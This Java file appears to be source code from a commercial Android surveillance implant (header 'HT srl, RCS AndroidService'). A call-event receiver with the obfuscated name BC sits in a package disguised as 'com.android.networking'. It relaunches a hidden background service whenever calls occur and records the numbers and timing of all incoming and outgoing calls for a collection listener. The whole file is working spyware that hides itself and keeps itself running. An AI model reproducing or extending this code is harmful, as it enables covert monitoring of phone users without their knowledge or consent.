/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

import com.android.networking.Call;
import com.android.networking.Core;
import com.android.networking.ServiceCore;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

public class BC extends BroadcastReceiver {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorCall"; //$NON-NLS-1$
	private static Call call = null;

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.content.BroadcastReceiver#onReceive(android.content.Context,
	 * android.content.Intent)
	 */
	@Override
	public void onReceive(Context context, Intent intent) {
		try {
			if (Core.isServiceRunning() == false) {
				Intent serviceIntent = new Intent(context, ServiceCore.class);

				// serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
				context.startService(serviceIntent);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (onReceive): Started from Call"); //$NON-NLS-1$
				}

				return;
			}

			if (intent == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
				}

				return;
			}


			String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (onReceive): extraIntent: " + extraIntent); //$NON-NLS-1$
			}

			if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
				final String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

				// Outgoing phone call
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onReceive): 1, number: " + number);//$NON-NLS-1$
				}

				call = new Call(number, Call.OUTGOING, Call.START);
			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) { // Il
																					// numero
																					// lo
																					// abbiamo
																					// solo
																					// qui!
				final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);

				// Phone is ringing
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onReceive): 2");//$NON-NLS-1$
				}

				call = new Call(number, Call.INCOMING, Call.START);
			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
				// Call disconnected
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onReceive): 3");//$NON-NLS-1$
				}

				if (call != null) {
					if (call.isIncoming())
						call = new Call("", Call.INCOMING, Call.END); //$NON-NLS-1$
					else
						call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$

					call.setComplete();
				}
			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { // Qui
																					// la
																					// chiamata
																					// e'
																					// davvero
																					// in
																					// corso
				// Call answered, or issuing new outgoing call
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onReceive): 4");//$NON-NLS-1$
				}

				if (call == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onReceive): we didn't catch the ringing"); //$NON-NLS-1$
					}
				} else {
					call.setComplete();
					Check.log(TAG + " (onReceive): 4, call ready");//$NON-NLS-1$
				}

				//call = new Call("", Call.OUTGOING, Call.START); //$NON-NLS-1$
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onReceive): default");//$NON-NLS-1$
				}

				call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
				call.setComplete();
			}

			// Caller/Callee number, incoming?/outgoing, in
			// progress?/disconnected
			if (call != null && call.isComplete() == true) {
				ListenerCall.self().dispatch(call);
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(TAG + " (onReceive) Error: " + ex);
			}
		}
	}
}
